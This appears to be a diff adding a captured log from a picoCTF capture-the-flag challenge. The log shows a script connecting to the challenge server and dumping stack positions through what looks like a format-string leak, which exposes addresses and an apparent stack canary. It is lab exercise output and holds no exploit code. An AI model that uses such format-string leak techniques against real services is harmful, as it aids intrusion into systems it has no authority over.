@@ -1,0 +1,37 @@
+[x] Opening connection to shape-facility.picoctf.net on port 62671
+[x] Opening connection to shape-facility.picoctf.net on port 62671: Trying 3.20.150.139
+[+] Opening connection to shape-facility.picoctf.net on port 62671: Done
+[*] Stack dump:
+Pos  1: 0x7f801da995c0     = 0x7f801da995c0
+Pos  6: 0x2432257c70243125 = 0x2432257c70243125
+Pos  7: 0x257c702433257c70 = 0x257c702433257c70
+Pos  8: 0x702435257c702434 = 0x702435257c702434
+Pos  9: 0x37257c702436257c = 0x37257c702436257c
+Pos 10: 0x7c702438257c7024 = 0x7c702438257c7024
+Pos 11: 0x3031257c70243925 = 0x3031257c70243925
+Pos 12: 0x70243131257c7024 = 0x70243131257c7024
+Pos 13: 0x257c70243231257c = 0x257c70243231257c
+Pos 14: 0x3431257c70243331 = 0x3431257c70243331
+Pos 15: 0x70243531257c7024 = 0x70243531257c7024
+Pos 16: 0x257c70243631257c = 0x257c70243631257c
+Pos 17: 0x3831257c70243731 = 0x3831257c70243731
+Pos 18: 0x7c7024           = 0x7c7024
+Pos 19: You heard in the distance: 0x4ebc6d2b8a425800
+Pos 20: 0x7fff57813de0     = 0x7fff57813de0
+Pos 21: 0x5b3a4570b413     = 0x5b3a4570b413
+Pos 22: 0x7fff57813e80     = 0x7fff57813e80
+Pos 23: 0x7f801d8bf1ca     = 0x7f801d8bf1ca
+Pos 24: 0x7fff57813e30     = 0x7fff57813e30
+Pos 25: 0x7fff57813f08     = 0x7fff57813f08
+Pos 26: 0x14570a040        = 0x14570a040
+Pos 27: 0x5b3a4570b401     = 0x5b3a4570b401
+Pos 28: 0x7fff57813f08     = 0x7fff57813f08
+Pos 29: 0x7266c7c824ace70a = 0x7266c7c824ace70a
+Pos 30: 0x1                = 0x1
+Pos 32: 0x5b3a4570dd78     = 0x5b3a4570dd78
+Pos 33: 0x7f801dae4000     = 0x7f801dae4000
+Pos 34: 0x7266c7c8224ce70a = 0x7266c7c8224ce70a
+Pos 35: %35You heard in the distance: $p
+Pos 36: 0x7fff00000000     = 0x7fff00000000
+Pos 39: 0x1                = 0x1
+[*] Closed connection to shape-facility.picoctf.net port 62671
